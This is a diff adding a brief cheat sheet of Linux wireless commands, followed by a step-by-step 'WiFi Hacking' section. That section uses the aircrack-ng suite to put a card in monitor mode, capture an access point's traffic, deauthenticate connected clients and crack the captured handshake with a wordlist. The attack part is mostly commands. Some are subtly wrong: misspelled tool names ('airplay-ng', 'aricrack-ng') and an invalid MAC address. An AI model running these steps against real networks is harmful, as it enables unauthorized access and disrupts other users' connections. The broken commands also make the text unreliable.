@@ -1,0 +1,31 @@
+Basic wireless commands:
+-iwconfig  (display Wi-Fi interface)
+-iwlist wlan0 scan (list all AP your network card reach)
+-nmcli dev wifi (views AP) => network manager command line interface
+-nmcli dev wifi connect <wifi name> password <wifi-password> (Connect with AP)
+
+
+---------WiFi Hacking commands--------
+
+To crack the wireless AP, you need the client MAC address, AP MAC address, the channel the target is operating on, and a password list.
+
+Step 1- Monitor Mode (network card should be on monitor mode) & run 'aircrack-ng' command 
+
+Command: airmon-ng start/stop/restart <interface> (airmon-ng start wlan0)
+
+Step 2- Gather crucial information wireless traffic
+
+Command: airodump-ng wlan0
+
+airodump-ng -c 10 --bssid 01:01:AA:88:CC:22 -w <wifi name> wlan0
+
+Above command captures all teh packets traversing the AP on channel 10 using the -c option
+
+In another terminal, you can use the 'airplay-ng' command to knock off (deauthenticate) anyone connected to the AP and force them to reauthenticate to the AP.
+
+Command: airplay-ng --deauth 100 -a 01:01:AA:88:CC:22 -c A0:A3:E2:44:7C:ES wlan0
+
+
+Finally, in the final terminal you can use a password list (wordlist.dic) to find the password in the captured hash (hacker-arisePSK.cap)
+
+Command: aricrack-ng -w wordlist.dic -b 01:01:AA:88:CC:22 <password hash file>
